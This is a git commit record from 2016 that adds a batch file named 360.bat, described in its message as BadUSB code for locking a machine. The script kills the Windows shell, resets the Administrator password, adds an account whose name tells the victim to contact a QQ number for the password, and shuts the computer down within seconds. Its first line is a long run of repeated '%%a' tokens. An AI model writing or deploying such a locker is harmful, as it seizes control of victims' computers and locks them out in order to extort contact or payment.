884197f277723b7aff944467932998f604be9981
chx <chxpostbox@outlook.com>
2016-11-29 17:13:12 +0800

    锁机的badusb代码

---
+++ vbs/360.bat
@@ -0,0 +1,10 @@
+%%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a 
+cls
+taskkill /im explorer.exe /f
+
+net user Administrator nicai
+net user chx
+net user 要密码联系619699629! woshizhu /add
+net localgroup 要密码联系619699629！ /add
+shutdown.exe -s -t 6
+ 
